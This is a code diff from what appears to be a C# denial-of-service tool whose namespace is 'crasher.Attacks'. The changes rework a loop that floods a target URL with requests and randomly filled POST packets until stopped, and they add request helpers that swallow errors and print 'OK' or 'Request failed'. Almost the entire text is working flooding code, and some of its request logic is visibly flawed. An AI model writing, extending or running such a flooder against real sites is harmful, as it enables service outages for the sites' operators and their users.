@@ -2,12 +2,15 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Linq.Expressions;
 using System.Net;
 using System.Net.Http;
+using System.Runtime.Serialization;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using crasher.Model;
+using WebException = System.Net.WebException;
 
 namespace crasher.Attacks
 {
@@ -63,25 +66,30 @@ namespace crasher.Attacks
          * **/
         private static void StartAttack()
         {
-            while (true)
+            while (!stopFlag)
             {
                 if (ThreadsStarted || !AttackSettings.Threading)
                 {
-                    if (stopFlag)
-                    {
-                        break;
-                    }
+                    bool requestStatus = false;
                     Byte[] packet = Helpers.NetHelper.RandomFillPackets(AttackSettings.PacketSize);
-                    SendData(Url,packet);
+                    
+                    //WebResponse response = SendData(Url,packet,out requestStatus);
+                    SendRequest(Url,out requestStatus);
+                    if (requestStatus)
+                    {
+                        Console.WriteLine("OK");
+                    }
+                    else
+                    {
+                        Console.WriteLine("Request failed..");
+                    }
                 }
                 else if (!ThreadsStarted)
                 {
                     System.Threading.Thread.Sleep(250);
                 }
-
             }
         }
-
         /**
          * Ferma l'attacco a seconda del tipo utilizzato
          * **/
@@ -109,41 +117,63 @@ namespace crasher.Attacks
             }
         }
 
-
-        public static string SendData(Uri url, byte[] data)
+        public static void SendRequest(Uri url, out bool status)
         {
-            // Create a request using a URL that can receive a post.   
+            WebClient client = new WebClient();
+            string response = null;
+            try
+            {
+                client.DownloadStringAsync(Url);
+            }
+            catch (WebException we)
+            {
+                Console.WriteLine("ERROR: " + we.Message);
+                status = false;
+                return;
+            }
+            finally
+            {
+                client.Dispose();
+            }
+
+            status = true;
+        }
+
+        public static WebResponse SendData(Uri url, byte[] data, out bool status)
+        {
             WebRequest request = WebRequest.Create(url);
-            // Set the Method property of the request to POST.  
             request.Method = "POST";
+
             byte[] byteArray = data;
-            // Set the ContentType property of the WebRequest.  
             request.ContentType = "application/x-www-form-urlencoded";
-            // Set the ContentLength property of the WebRequest.  
             request.ContentLength = byteArray.Length;
-            // Get the request stream.  
-            Stream dataStream = request.GetRequestStream();
-            // Write the data to the request stream.  
-            dataStream.Write(byteArray, 0, byteArray.Length);
-            // Close the Stream object.  
-            dataStream.Close();
-            // Get the response.  
-            WebResponse response = request.GetResponse();
-            // Display the status.  
-            Console.WriteLine(((HttpWebResponse)response).StatusDescription);
-            // Get the stream containing content returned by the server.  
-            dataStream = response.GetResponseStream();
-            // Open the stream using a StreamReader for easy access.  
-            StreamReader reader = new StreamReader(dataStream);
-            // Read the content.  
-            string responseFromServer = reader.ReadToEnd();
 
-            reader.Close();
-            dataStream.Close();
-            response.Close();
+            try
+            {
+                Stream dataStream = request.GetRequestStream();
+                // Write the data to the request stream.  
+                dataStream.Write(byteArray, 0, byteArray.Length);
+                // Close the Stream object.  
+                dataStream.Close();
+            }
+            catch (WebException we)
+            {
+                status = false;
+                return null;
+            }
 
-            // Return response content.  
-            return responseFromServer;
+
+            //SOME SITES DO HTTP ERROR CODE 500
+            status = true;
+            try
+            {
+                return request.GetResponse();
+
+            }
+            catch (WebException ex)
+            {
+                return null;
+            }
         }
     }
 }
